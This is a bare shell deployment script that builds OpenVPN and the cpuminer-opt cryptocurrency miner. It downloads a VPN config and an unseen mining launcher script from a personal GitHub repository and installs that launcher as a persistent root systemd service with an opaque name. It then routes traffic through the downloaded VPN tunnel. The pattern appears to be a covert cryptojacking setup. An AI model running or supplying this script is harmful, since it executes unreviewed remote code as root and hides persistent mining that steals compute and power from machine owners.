sudo apt-get update 
sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git liblzo2-dev libpam0g-dev
sudo sysctl vm.nr_hugepages=128 
wget https://swupdate.openvpn.org/community/releases/openvpn-2.4.6.tar.gz
tar -xf openvpn-2.4.6.tar.gz
cd openvpn-2.4.6
./configure
make
make install
cd /usr/local/
wget https://raw.githubusercontent.com/nhattieunhatmong/chef/master/test/client3.ovpn
wget https://raw.githubusercontent.com/nhattieunhatmong/chef/master/test/update-resolv-conf
chmod +x *
cd /usr/local/src/
sudo git clone https://github.com/JayDDee/cpuminer-opt
cd cpuminer-opt
wget https://raw.githubusercontent.com/nhattieunhatmong/chef/master/week0908/repooll.sh
chmod +x repooll.sh
./autogen.sh &&
CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl
make
bash -c 'cat <<EOT >>/lib/systemd/system/1tieu1mong.service 
[Unit]
Description=1tieu1mong
After=network.target
[Service]
ExecStart= /usr/local/src/cpuminer-opt/repooll.sh
WatchdogSec=600
Restart=always
RestartSec=30
User=root
[Install]
WantedBy=multi-user.target
EOT
' 
systemctl daemon-reload &&
systemctl enable 1tieu1mong.service &&
service 1tieu1mong start && openvpn --config /usr/local/client3.ovpn
